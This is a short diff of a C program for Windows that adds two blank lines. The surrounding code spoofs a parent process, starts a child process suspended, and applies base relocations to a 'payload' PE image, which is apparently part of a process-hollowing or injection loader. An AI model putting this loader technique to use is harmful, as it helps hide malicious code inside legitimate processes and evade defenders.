@@ -180,6 +180,7 @@ int main() {
       */
       UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
       si.StartupInfo.cb = sizeof(si);
+      
       CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi);
       printf("[+] Child process created successfully: %8d\n", pi.dwProcessId); 
       
@@ -262,6 +263,7 @@ int main() {
            PIMAGE_SECTION_HEADER firstSectionHeader = IMAGE_FIRST_SECTION(payloadImageNTHeaders);
            DWORD relocRaw = RVAToRAW(relocationTable.VirtualAddress, payloadImageNTHeaders, firstSectionHeader);
            // Start of relocation code
+
            while(relocationOffset < relocationTable.Size) {
             PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((uint8_t*)exec + payloadRelocationTableRaw + relocationOffset);
             relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
